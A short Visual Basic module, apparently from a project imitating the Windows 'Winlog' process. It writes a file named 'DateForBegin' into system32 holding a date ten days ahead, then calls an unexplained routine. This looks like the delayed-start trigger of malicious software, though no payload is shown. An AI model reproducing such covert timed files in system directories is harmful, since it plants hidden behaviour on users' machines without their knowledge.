Attribute VB_Name = "Heard"
Option Explicit
Sub Main()
Dim Directory As New Winlog_Main.Windir
Dim a As String
a = Directory.dir
Open a & "\system32\DateForBegin" For Binary As #1
Put #1, , Now + TimeSerial(240, 0, 0)
Close #1
Directory.a
End Sub
